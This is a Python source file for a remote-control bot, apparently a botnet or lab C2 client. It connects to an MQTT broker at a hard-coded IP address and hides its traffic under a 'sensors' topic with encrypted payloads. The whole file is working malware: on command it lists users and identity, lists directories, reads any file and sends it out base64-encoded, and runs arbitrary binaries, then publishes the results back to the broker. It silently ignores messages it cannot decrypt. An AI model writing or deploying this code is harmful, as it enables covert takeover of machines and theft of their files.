import paho.mqtt.client as mqtt
import subprocess
import shlex
import base64
import os
from security import SecureComm
from cryptography.fernet import InvalidToken

BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"

crypto = SecureComm()

def execute_binary(command_string):
    try:
        args = shlex.split(command_string)
        output = subprocess.check_output(args, stderr=subprocess.STDOUT).decode()
        return f"EXEC_OUTPUT:\n{output}"
    except subprocess.CalledProcessError as e:
        return f"EXEC_ERROR (Code {e.returncode}):\n{e.output.decode()}"
    except Exception as e:
        return f"EXEC_EXCEPTION: {str(e)}"

def get_file_content(path):
    if not os.path.exists(path):
        return f"FILE_ERROR: File {path} not found."
    try:
        with open(path, "rb") as f:
            encoded_data = base64.b64encode(f.read()).decode('utf-8')
            return f"FILE_DATA:{os.path.basename(path)}:{encoded_data}"
    except Exception as e:
        return f"FILE_ERROR: {str(e)}"

def on_message(client, userdata, msg):
    try:
        decrypted_raw = crypto.decrypt(msg.payload)
        
        # Only process if it is a Command (C:)
        if decrypted_raw.startswith("C:"):
            command = decrypted_raw[2:]
            print(f"[*] Command: {command}")

            if command == "PING":
                response = "BOT_STATUS: ONLINE"
            elif command == "GET_USERS":
                response = subprocess.getoutput('w')
            elif command == "GET_ID":
                response = subprocess.getoutput('id')
            elif command.startswith("LS:"):
                path = command.split(":", 1)[1]
                response = subprocess.getoutput(f'ls {shlex.quote(path)}')
            elif command.startswith("GET_FILE:"):
                path = command.split(":", 1)[1]
                response = get_file_content(path)
            elif command.startswith("EXEC:"):
                binary_path = command.split(":", 1)[1]
                response = execute_binary(binary_path)
            else:
                response = "UNKNOWN_COMMAND"

            # Send response with prefix R:
            client.publish(TOPIC, crypto.encrypt(f"R:{response}"))
            
    except InvalidToken:
        # Silently ignore messages encrypted with a different key or plain text
        pass
    except Exception:
        # Ignore other formatting errors
        pass

client = mqtt.Client("LinuxBot_Service")
client.on_message = on_message
client.connect(BROKER, PORT)
client.subscribe(TOPIC) 
client.loop_forever()